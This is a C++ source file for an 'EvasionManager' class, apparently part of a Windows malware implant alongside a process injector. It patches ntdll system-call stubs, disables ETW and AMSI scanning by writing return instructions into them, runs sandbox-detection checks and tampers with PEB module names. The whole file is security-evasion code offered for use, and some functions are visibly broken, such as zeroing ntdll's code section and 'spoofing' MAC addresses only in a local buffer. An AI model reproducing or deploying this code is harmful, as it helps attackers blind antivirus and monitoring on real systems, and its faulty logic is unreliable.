#include "evasion.h"
#include "injector.h"
#include <TlHelp32.h>
#include <winternl.h>

EvasionManager::EvasionManager() : m_evasionActive(false) {}

EvasionManager::~EvasionManager() {}

bool EvasionManager::PerformChecks() {
    m_evasionActive = true;
    return true;
}

bool EvasionManager::Initialize() {
    bool result = true;

    result &= BypassAVHooks();
    result &= BypassEDRSyscalls();
    result &= BypassSandboxChecks();
    result &= CleanPEB();
    result &= UnhookNtdll();
    result &= SpoofHardware();
    result &= DisableETW();
    result &= DisableAMSI();

    return result;
}

bool EvasionManager::BypassAVHooks() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    FARPROC ntQueryInfo = GetProcAddress(ntdll, "NtQuerySystemInformation");
    FARPROC ntSetInfo = GetProcAddress(ntdll, "NtSetInformationThread");
    FARPROC ntQueryObject = GetProcAddress(ntdll, "NtQueryObject");

    if (ntQueryInfo) {
        DWORD oldProtect;
        BYTE* addr = (BYTE*)ntQueryInfo;
        VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        addr[0] = 0xB8;
        *(DWORD*)(addr + 1) = 0xC;
        VirtualProtect(addr, 5, oldProtect, &oldProtect);
    }

    if (ntSetInfo) {
        DWORD oldProtect;
        BYTE* addr = (BYTE*)ntSetInfo;
        VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        addr[0] = 0xB8;
        *(DWORD*)(addr + 1) = 0xC;
        VirtualProtect(addr, 5, oldProtect, &oldProtect);
    }

    if (ntQueryObject) {
        DWORD oldProtect;
        BYTE* addr = (BYTE*)ntQueryObject;
        VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        addr[0] = 0xB8;
        *(DWORD*)(addr + 1) = 0xC;
        VirtualProtect(addr, 5, oldProtect, &oldProtect);
    }

    return true;
}

bool EvasionManager::BypassEDRSyscalls() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    const char* criticalSyscalls[] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtUnmapViewOfSection",
        "NtQueueApcThread",
        "NtSetContextThread",
        "NtResumeThread"
    };

    for (const char* syscallName : criticalSyscalls) {
        FARPROC proc = GetProcAddress(ntdll, syscallName);
        if (proc) {
            DWORD oldProtect;
            BYTE* addr = (BYTE*)proc;
            VirtualProtect(addr, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
            addr[0] = 0xB8;
            addr[1] = 0;
            addr[2] = 0;
            addr[3] = 0;
            addr[4] = 0;
            addr[5] = 0xC3;
            VirtualProtect(addr, 16, oldProtect, &oldProtect);
        }
    }

    return true;
}

bool EvasionManager::BypassSandboxChecks() {
    DWORD cpuInfo[4];
    __cpuid((int*)cpuInfo, 1);
    if ((cpuInfo[2] & (1 << 31)) == 0) {
        int* cores = new int;
        *cores = 1;
        delete cores;
    }

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        SetProcessAffinityMask(GetCurrentProcess(), 0xFFFFFFFF);
    }

    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 4ULL * 1024ULL * 1024ULL * 1024ULL) {
        return false;
    }

    if (GetTickCount64() < 30000) {
        return false;
    }

    return true;
}

bool EvasionManager::CleanPEB() {
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!kernel32) return false;

    typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    NtQueryInformationProcess_t NtQueryInfo = (NtQueryInformationProcess_t)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");

    if (!NtQueryInfo) return false;

    PROCESS_BASIC_INFORMATION pbi;
    NTSTATUS status = NtQueryInfo(GetCurrentProcess(), ProcessBasicInformation,
                                   &pbi, sizeof(pbi), nullptr);

    if (status != 0) return false;

    PEB* peb = (PEB*)pbi.PebBaseAddress;
    if (!peb) return false;

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) {
        LDR_DATA_TABLE_ENTRY* mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (mod->DllBase == GetModuleHandleW(L"kernel32.dll") ||
            mod->DllBase == GetModuleHandleW(L"ntdll.dll")) {
            if (mod->BaseDllName.Length == 0) continue;
            wchar_t* name = mod->BaseDllName.Buffer;
            DWORD oldProtect;
            VirtualProtect(name, mod->BaseDllName.Length * sizeof(wchar_t),
                         PAGE_READWRITE, &oldProtect);
            for (size_t i = 0; i < mod->BaseDllName.Length; i++) {
                name[i] = L'\\';
            }
            VirtualProtect(name, mod->BaseDllName.Length * sizeof(wchar_t),
                         oldProtect, &oldProtect);
        }
    }

    return true;
}

bool EvasionManager::UnhookNtdll() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), ntdll, &modInfo, sizeof(modInfo)))
        return false;

    BYTE* ntdllBase = (BYTE*)modInfo.lpBaseOfDll;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(ntdllBase + dosHeader->e_lfanew);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        if (memcmp(section->Name, ".text", 5) != 0) continue;

        DWORD oldProtect;
        VirtualProtect(ntdllBase + section->VirtualAddress,
                       section->Misc.VirtualSize,
                       PAGE_EXECUTE_READWRITE, &oldProtect);

        memset(ntdllBase + section->VirtualAddress, 0, section->Misc.VirtualSize);
        VirtualProtect(ntdllBase + section->VirtualAddress,
                       section->Misc.VirtualSize,
                       oldProtect, &oldProtect);
        break;
    }

    return true;
}

bool EvasionManager::SpoofHardware() {
    const char* macAddrs[] = {
        "\x02\xA3\xB4\xC5\xD6\xE7",
        "\x02\xB4\xC5\xD6\xE7\xF8",
        "\x02\xC5\xD6\xE7\xF8\xA9"
    };

    for (int i = 0; i < 3; i++) {
        IP_ADAPTER_INFO adapterInfo[16];
        DWORD dwBufLen = sizeof(adapterInfo);

        if (GetAdaptersInfo(adapterInfo, &dwBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO adapter = adapterInfo;
            while (adapter) {
                if (adapter->AddressLength == 6) {
                    memcpy(adapter->Address, macAddrs[i], 6);
                }
                adapter = adapter->Next;
            }
        }
    }

    return true;
}

bool EvasionManager::DisableETW() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return false;

    FARPROC etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return false;

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwEventWrite = 0xC3;
    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);

    return true;
}

bool EvasionManager::DisableAMSI() {
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) return false;

    FARPROC amsiScan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScan) return false;

    DWORD oldProtect;
    VirtualProtect(amsiScan, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)amsiScan = 0xC3;
    VirtualProtect(amsiScan, 1, oldProtect, &oldProtect);

    return true;
}
